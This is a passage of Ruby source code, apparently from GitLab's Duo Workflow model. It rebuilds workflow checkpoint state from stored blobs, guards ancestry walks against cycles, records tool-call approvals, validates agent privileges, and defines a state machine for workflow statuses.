      # (abandoned-branch) checkpoints are never collected.
      def ancestor_thread_ts(checkpoint)
        # A current_thread group is context-budget bounded (current_thread bumps on
        # every compaction), so the map stays small.
        rows = checkpoint_header_rows.select { |row| row[3] == checkpoint.current_thread }
        walk_ancestry(parent_ts_map(rows), checkpoint.thread_ts)
      end

      # Assemble channel_values from incremental blobs, overlaying the reconstructed
      # channels onto whatever base the header carries. With self-contained blob
      # groups the blobs rebuild every reconstructable channel on their own; the
      # merge only preserves non-blobbed scalar channels a slim header may still
      # hold (empty for a header-table read). Falls back to the base when no blobs
      # exist. See #accumulated_blobs_for for `channels`.
      def reconstructed_channel_values(checkpoint, channels: nil)
        base = checkpoint.checkpoint&.dig('channel_values') || {}
        base = base.slice(*channels) if channels
        blobs = accumulated_blobs_for(checkpoint, channels: channels).to_a
        return base if blobs.empty?

        base.merge(::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs).channel_values)
      end

      # Every blob on `checkpoints`' ancestor chains in one query, grouped by
      # thread_ts, so reconstructing a page costs one blob query instead of one per
      # checkpoint. Chains overlap heavily along a lineage, so the union is far
      # smaller than the sum. Pair with #reconstructed_channel_values_from.
      def blobs_by_thread_ts_for(checkpoints)
        chain = checkpoints.flat_map { |checkpoint| ancestor_thread_ts(checkpoint) }.uniq
        return {} if chain.empty?

        checkpoint_blobs
          .where(project_id: project_id, thread_ts: chain)
          .order(:id)
          .group_by(&:thread_ts)
      end

      # #reconstructed_channel_values against blobs already loaded by
      # #blobs_by_thread_ts_for. Filters current_thread in Ruby to match
      # #accumulated_blobs_for: a re-send after a gateway restart can repeat a
      # thread_ts under current_thread 0, and those blobs must not join this fold.
      def reconstructed_channel_values_from(checkpoint, blobs_by_thread_ts)
        base = checkpoint.checkpoint&.dig('channel_values') || {}
        blobs = ancestor_thread_ts(checkpoint)
          .flat_map { |thread_ts| blobs_by_thread_ts[thread_ts] || [] }
          .select { |blob| blob.current_thread == checkpoint.current_thread }
          # blob[:id], not blob.id: the PK is composite, so #id returns an array
          # and the fold order would follow the PK's column order.
          .sort_by { |blob| blob[:id] }
        return base if blobs.empty?

        base.merge(::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs).channel_values)
      end

      # One channel folded from its blobs in the current group, for scalar
      # (replace) channels like status: the fold keeps the latest value. Unlike
      # #channel_message_history it stays in the current group (#accumulated_blobs_for)
      # -- a scalar does not need cross-compaction history -- and decodes only the
      # one channel. Falls back to the header when no blobs exist for it.
      def reconstructed_channel(checkpoint, channel)
        blobs = accumulated_blobs_for(checkpoint).where(channel: channel).to_a
        return checkpoint.checkpoint&.dig('channel_values', channel) if blobs.empty?

        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs).channel_values[channel]
      end

      # thread_ts of `checkpoint` and every ancestor to the root, across all
      # current_thread groups. Unlike #ancestor_thread_ts (one group), this walks
      # the whole parent_ts chain so message history spans compactions -- a
      # compaction is a prompt-window optimization, not an edit to the
      # conversation. Off-path (abandoned-branch) checkpoints are never collected.
      def full_ancestor_thread_ts(checkpoint)
        walk_ancestry(parent_ts_map(checkpoint_header_rows), checkpoint.thread_ts)
      end

      # All header rows, plucked once and shared by both ancestor walks so a
      # multi-channel read plucks the headers once. Unordered to keep the selective
      # workflow_id index; #parent_ts_map sorts by id in Ruby. Bounded by the
      # workflow's checkpoint count.
      def checkpoint_header_rows
        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- bounded by the workflow's checkpoint count
        checkpoint_headers.pluck(:id, :thread_ts, :parent_ts, :current_thread)
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end
      strong_memoize_attr :checkpoint_header_rows

      # thread_ts -> parent_ts, latest id wins per thread_ts. A re-sent header keeps
      # the same parent_ts, so the id sort only makes the result deterministic.
      def parent_ts_map(rows)
        rows.sort_by(&:first).to_h { |_id, thread_ts, parent_ts, _current_thread| [thread_ts, parent_ts] }
      end

      # Walk the parent_ts chain from `start_ts` using `parent_of`. DWS parent links
      # should form a tree, but guard the walk: a self-parent or cycle would loop
      # this request forever. Raise (fail-visible) rather than truncate, so a corrupt
      # chain surfaces instead of silently reconstructing partial channel_values.
      def walk_ancestry(parent_of, start_ts)
        path = []
        ts = start_ts
        while ts && parent_of.key?(ts)
          raise CyclicAncestryError, "Cyclic checkpoint ancestry at thread_ts #{ts}" if path.include?(ts)

          path << ts
          ts = parent_of[ts]
        end
        path
      end

      # Blobs for `channel` across `thread_ts_chain`, an ancestor chain spanning every
      # current_thread group (see #full_ancestor_thread_ts), oldest-first. For message
      # history display, which must span compaction groups. project_id leads
      # idx_duo_wf_checkpoint_blobs_dedup; the partition bound comes from the
      # checkpoint_blobs association scope.
      def history_blobs_for(thread_ts_chain, channel)
        checkpoint_blobs
          .where(
            project_id: project_id,
            thread_ts: thread_ts_chain,
            channel: channel
          )
          .order(:id)
      end

      # Full message history for `channel`, folded across every compaction group:
      # all conversation deltas kept, compaction summaries dropped (see
      # ChannelValuesReconstructor#channel_history). The caller decides when to
      # reconstruct (see WorkflowCheckpointEventPresenter).
      def channel_message_history(checkpoint, channel)
        # Walk the chain here rather than via #full_ancestor_thread_ts so the same
        # header read also stamps each message with its checkpoint's parent_ts.
        ancestry = parent_ts_map(checkpoint_header_rows)
        blobs = history_blobs_for(walk_ancestry(ancestry, checkpoint.thread_ts), channel).to_a
        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor
          .new(blobs)
          .channel_history(channel, ancestry, alternative_counts(ancestry))
      end

      # Alternatives count per message (messages that share a chat log parent).
      # Absent when a message has no alternatives; callers read those as none.
      def alternative_counts(ancestry)
        chat_log_parent_of = thread_ts_to_chat_log_parent_ts_map(ancestry)
        messages_per_parent = chat_log_parent_of.each_value.tally

        chat_log_parent_of.filter_map do |thread_ts, chat_log_parent_ts|
          alternatives_count = messages_per_parent[chat_log_parent_ts] - 1
          [thread_ts, alternatives_count] if alternatives_count > 0
        end.to_h
      end

      # thread_ts -> thread_ts of its chat log parent: the closest ancestor that wrote to
      # ui_chat_log, skipping checkpoints that wrote none (a fork marker, or the one that
      # paused for input). Absent for the first, which has no such ancestor.
      def thread_ts_to_chat_log_parent_ts_map(ancestry)
        wrote_chat_log = chat_log_thread_ts

        wrote_chat_log.each_with_object({}) do |thread_ts, chat_log_parent_of|
          ancestor_ts = ancestry[thread_ts]

          # Runs of skipped checkpoints are a step or two; the bound only stops a cyclic
          # chain from looping forever (see #walk_ancestry).
          ancestry.size.times do
            break if ancestor_ts.nil? || wrote_chat_log.include?(ancestor_ts)

            ancestor_ts = ancestry[ancestor_ts]
          end

          next unless ancestor_ts

          # The bound is the checkpoint count, so an acyclic chain always reaches nil or
          # a chat log ancestor first. Landing anywhere else means a cycle: raise, rather
          # than group the message under a checkpoint that wrote no chat log.
          unless wrote_chat_log.include?(ancestor_ts)
            raise CyclicAncestryError, "Cyclic checkpoint ancestry at thread_ts #{ancestor_ts}"
          end

          chat_log_parent_of[thread_ts] = ancestor_ts
        end
      end

      # thread_ts of every checkpoint that wrote to ui_chat_log, read from blob metadata:
      # a delta is only written when the log grew or changed, so a row means the
      # checkpoint added messages. Spans every branch, not just the current one, so
      # abandoned attempts still count.
      #
      # project_id + workflow_id lead idx_duo_wf_checkpoint_blobs_dedup, which also
      # carries thread_ts and channel, so this runs index-only -- the message role
      # cannot be filtered here, since the payload is compressed.
      def chat_log_thread_ts
        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- bounded by the workflow's checkpoint count
        checkpoint_blobs
          .where(project_id: project_id, channel: 'ui_chat_log')
          .distinct
          .pluck(:thread_ts)
          .to_set
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      # Decode only the newest conversation blob for `channel` -- its tail is the
      # most recent message. Skips compaction snapshots so previews show a real
      # message, not an internal summary. Cheaper than #channel_message_history.
      def latest_channel_message(checkpoint, channel)
        blob = history_blobs_for(full_ancestor_thread_ts(checkpoint), channel).where(step_action: 'conversation').last
        blob && ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.decode(blob.data)
      end

      # Every blob across the full ancestor chain (all current_thread groups),
      # oldest first, for every channel. Unlike #history_blobs_for, this is not
      # scoped to one channel, so it feeds the complete trace. See
      # #accumulated_blobs_for for `channels`.
      def full_history_blobs(checkpoint, channels: nil)
        scope = checkpoint_blobs.where(project_id: project_id, thread_ts: full_ancestor_thread_ts(checkpoint))
        scope = scope.where(channel: channels) if channels
        scope.order(:id)
      end

      # Complete trace artifact: every recorded change to every channel across the
      # whole session, oldest first. A single-thread read returns only the final
      # snapshot of that thread; this keeps the value changes (plan, status) and
      # the full message history, so the trace shows how the session progressed.
      # `channels`, when given, skips fetching and decoding the rest -- for a
      # non-owner read, whose response drops them anyway.
      def full_trace_channel_values(channels: nil)
        header = latest_checkpoint_header
        return {} unless header

        blobs = full_history_blobs(header, channels: channels).to_a
        reconstructor = ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs)
        blobs.map(&:channel).uniq.index_with { |channel| reconstructor.channel_changes(channel) }
      end

      def status_group
        GROUPED_STATUSES.find do |_group, statuses|
          statuses.include?(status_name)
        end&.first
      end

      # Whether the flow has finished (success, failure, or cancellation). Used as
      # the authoritative "terminal owns the surface now" signal so live-progress
      # streaming stops once the flow is done -- no separate flag to keep in sync.
      def status_terminal?
        TERMINAL_STATUSES.include?(status_name)
      end

      def web_url
        return unless project_level?

        "#{Gitlab::Routing.url_helpers.project_automate_agent_sessions_url(project)}/#{id}"
      end

      def add_tool_call_approval(tool_name:, call_args:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_approval(tool_name: tool_name, call_args: call_args)
        self.tool_call_approvals = approvals.to_h
      end

      def add_tool_call_pattern_approval(tool_name:, pattern:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_pattern_approval(tool_name: tool_name, pattern: pattern)
        self.tool_call_approvals = approvals.to_h
      end

      private

      def set_title_from_workflow_definition
        self.title = workflow_definition.truncate(TITLE_MAX_LENGTH)
      end

      def valid_service_account_user
        return if service_account.nil?
        return if service_account.service_account?

        errors.add(:service_account, 'must be a service account user')
      end

      def item_matches_version
        return if ai_catalog_item_id.nil? || ai_catalog_item_version_id.nil?
        return if ai_catalog_item_version&.ai_catalog_item_id == ai_catalog_item_id

        errors.add(:ai_catalog_item_id, 'must match the catalog item of the version')
      end

      def only_known_pre_approved_agent_privileges
        return if pre_approved_agent_privileges.nil?

        pre_approved_agent_privileges.each do |privilege|
          next if AgentPrivileges::ALL_PRIVILEGES.key?(privilege)

          errors.add(:pre_approved_agent_privileges, "contains an invalid value #{privilege}")
        end
      end

      def pre_approved_privileges_included_in_agent_privileges
        # both columns will use db default values which are equal
        return if pre_approved_agent_privileges.nil? && agent_privileges.nil?

        pre_approved_privileges_with_defaults = pre_approved_agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES
        agent_privileges_with_defaults = agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES

        pre_approved_privileges_with_defaults.each do |privilege|
          next if agent_privileges_with_defaults.include?(privilege)

          errors.add(
            :pre_approved_agent_privileges,
            "contains privilege #{privilege} not present in agent_privileges"
          )
        end
      end

      state_machine :status, initial: :created do
        event :start do
          transition created: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:start)
        end

        # Fires only on the initial start (created -> running), not on resume/retry.
        # Scoped to messaging-triggered workflows so we don't emit for every CI workflow.
        after_transition on: :start do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowStartedEvent.new(data: { workflow_id: workflow.id })
            )
          end
        end

        event :pause do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:pause)
        end

        event :require_input do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_input)
        end

        event :require_plan_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_plan_approval)
        end

        event :require_tool_call_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_tool_call_approval)
        end

        event :resume do
          transition [
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:resume)
        end

        event :retry do
          transition [:running, :stopped, :failed] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:retry)
        end

        event :finish do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:finish)
        end

        # Fires only on successful completion (running -> finished), not on drop/stop.
        # Scoped to messaging-triggered workflows so we don't emit for every CI workflow.
        after_transition on: :finish do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowFinishedEvent.new(data: { workflow_id: workflow.id })
            )
          end
        end

        event :drop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:drop)
        end

        event :stop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:stop)
        end

        state :created, value: 0
        state :running, value: 1
        state :paused, value: 2
        state :finished, value: 3
        state :failed, value: 4
        state :stopped, value: 5
        state :input_required, value: 6
        state :plan_approval_required, value: 7
        state :tool_call_approval_required, value: 8
      end
    end
  end
end
